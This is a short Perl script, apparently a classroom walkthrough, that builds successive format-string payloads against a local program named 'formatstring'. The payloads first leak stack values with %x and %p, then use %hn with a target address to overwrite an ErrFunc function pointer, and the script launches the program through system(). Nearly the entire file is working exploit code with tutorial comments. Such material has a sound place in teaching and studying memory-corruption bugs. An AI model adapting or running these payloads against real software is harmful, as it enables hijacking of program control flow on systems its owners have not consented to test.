# Comment out each $arg string, and uncomment the next to follow along

# This is the first cut at an exploit string
# The last %p will show up pointing at 0x67666500
# Translate this due to little-endian architecture, and we get 0x00656667
 $arg = "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%p"."ABC";

# Now comment out the above $arg, and use this one
# $arg = "......%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%p"."ABC";

# Now we're actually going to start writing memory - let's overwrite the ErrFunc pointer
# $arg = ".....%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%hn"."\x1c\xff\x12";

# Finally, uncomment this one to see the exploit really work
# $arg = "%.4066x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%hn"."\x1c\xff\x12";

$cmd = "formatstring ".$arg;

system($cmd);

